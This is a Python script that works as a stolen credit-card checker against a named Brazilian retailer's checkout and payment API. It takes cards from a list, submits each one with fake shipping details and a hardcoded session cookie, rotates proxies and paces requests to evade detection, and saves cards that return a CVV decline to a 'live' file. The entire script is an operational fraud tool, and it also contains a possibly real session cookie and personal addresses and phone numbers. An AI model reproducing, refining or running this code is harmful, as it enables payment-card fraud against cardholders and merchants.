import requests
import urllib3
from datetime import datetime, timedelta
import random
import time
import os

# Desativa os avisos de SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Calculate tomorrow's date
tomorrow = datetime.now() + timedelta(days=1)
delivery_date = tomorrow.strftime("%Y-%m-%d")

# Read proxies from file if it exists
def load_proxies():
    if os.path.exists('proxy.txt'):
        with open('proxy.txt', 'r') as f:
            return [line.strip() for line in f if line.strip()]
    return []

proxies = load_proxies()
use_proxies = len(proxies) > 0

if use_proxies:
    print(f"Found {len(proxies)} proxies. Will use proxy rotation.")
else:
    print("No proxies found. Will make direct requests.")

urlDelivery = "https://tauste.com.br/marilia/rest/marilia/V1/carts/mine/shipping-information"
urlPagamento = "https://tauste.com.br/marilia/rest/marilia/V1/carts/mine/payment-information"
headers = {
    "Host": "tauste.com.br",
    "Cookie": "form_key=yPVNKNckch89uYwr; PHPSESSID=11d78cb615bcbbcd9270d5c9dab8e9da",
    #"x-newrelic-id": "VwQAVl9aCBABVFlbBwUDXlQI",
    "sec-ch-ua-platform": "\"Windows\"",
    "sec-ch-ua": "\"Chromium\";v=\"136\", \"Brave\";v=\"136\", \"Not.A/Brand\";v=\"99\"",
    #"newrelic": "eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjMyNzc5OTAiLCJhcCI6IjExMjAwMTY2ODMiLCJpZCI6IjVhNmY3ODViMjllNmJhMDUiLCJ0ciI6IjhhNmJkYWE2OWVkNjZiYWFiYTRkNDc0YTgwODE2ODc3IiwidGkiOjE3NDg1MjIyNjY0MjksInRrIjoiMTMyMjg0MCJ9fQ==",
    "sec-ch-ua-mobile": "?0",
    #"traceparent": "00-8a6bdaa69ed66baaba4d474a80816877-5a6f785b29e6ba05-01",
    "x-requested-with": "XMLHttpRequest",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
    "accept": "*/*",
    "content-type": "application/json",
    #"tracestate": "1322840@nr=0-1-3277990-1120016683-5a6f785b29e6ba05----1748522266429",
    "sec-gpc": "1",
    "accept-language": "en-US,en;q=0.8",
    "origin": "https://tauste.com.br",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://tauste.com.br/jundiai/checkout/",
    "priority": "u=1, i"
}

def get_random_proxy():
    if not proxies:
        return None
    proxy = random.choice(proxies)
    return {
        'http': f'http://{proxy}',
        'https': f'http://{proxy}'
    }

def process_card(card_info):
    card_number, exp_month, exp_year, cvv = card_info.strip().split('|')
    payloadDelivery = {
        "addressInformation": {
            "shipping_address": {
                "countryId": "BR",
                "regionId": "1524",
                "regionCode": "SP",
                "region": "São Paulo",
                "street": ["Avenida República", "4322", "Palmital", ""],
                "telephone": "(61) 99603-4755",
                "postcode": "17509031",
                "city": "Marília",
                "firstname": "Benedito",
                "lastname": "Geraldo Mel",
                "saveInAddressBook": 1,
                "customAttributes": [{
                    "attribute_code": "taxvat",
                    "value": ""
                }],
                "extension_attributes": {}
            },
            "billing_address": {
                "countryId": "BR",
                "regionId": "1524",
                "regionCode": "SP",
                "region": "São Paulo",
                "street": ["Alameda Santos", "323", "Cerqueira César", ""],
                "telephone": "(89) 99412-4475",
                "postcode": "01419002",
                "city": "São Paulo",
                "firstname": "Benedito",
                "lastname": "Geraldo Mel",
                "saveInAddressBook": 1
            },
            "shipping_method_code": "amstrates2",
            "shipping_carrier_code": "amstrates",
            "extension_attributes": {
                "amdeliverydate_date": delivery_date,
                "amdeliverydate_time_id": 80
            }
        }
    }

    payloadPagamento = {
        "cartId": "7550149",
        "paymentMethod": {
            "additional_data": {
                "cc_cid": cvv,
                "cc_type": "Braspag-Visa",
                "cc_exp_month": exp_month,
                "cc_savecard": 0,
                "cc_installments": "",
                "cc_owner": "Luiz Silva",
                "cc_number": card_number,
                "cc_soptpaymenttoken": "",
                "cc_exp_year": exp_year
            },
            "method": "braspag_pagador_creditcard"
        },
        "billingAddress": {
            "regionCode": "SP",
            "firstname": "Benedito",
            "regionId": "1524",
            "city": "São Paulo",
            "street": [
                "Alameda Santos",
                "323",
                "Cerqueira César",
                ""
            ],
            "postcode": "01419-002",
            "saveInAddressBook": 1,
            "telephone": "(89) 99412-4475",
            "region": "São Paulo",
            "countryId": "BR",
            "lastname": "Geraldo Mel"
        }
    }

    proxy = None
    if use_proxies:
        proxy = get_random_proxy()
        print(f"Using proxy: {proxy['http']}")
    
    try:
        response = requests.post(urlDelivery, json=payloadDelivery, headers=headers, verify=False, proxies=proxy, timeout=30)
        response = requests.post(urlPagamento, json=payloadPagamento, headers=headers, verify=False, proxies=proxy, timeout=30)
        
        error_message = response.json().get('message', 'Unknown error')
        if error_message == "Decline for CVV2 failure":
            print(f"LIVE - {card_number}|{exp_month}|{exp_year}|{cvv} - {error_message}")
            # Save to live.txt
            with open('live.txt', 'a') as live_file:
                live_file.write(f"{card_number}|{exp_month}|{exp_year}|{cvv}\n")
        else:
            print(f"DIE {card_number}|{exp_month}|{exp_year}|{cvv} - {error_message}")
    except Exception as e:
        print(f"DIE {card_number}|{exp_month}|{exp_year}|{cvv} - Error: {str(e)}")

# Read and process cards from lista.txt
with open('lista.txt', 'r') as file:
    for line in file:
        if line.strip():  # Skip empty lines
            process_card(line)
            # Add 10 second delay between requests
            time.sleep(10)
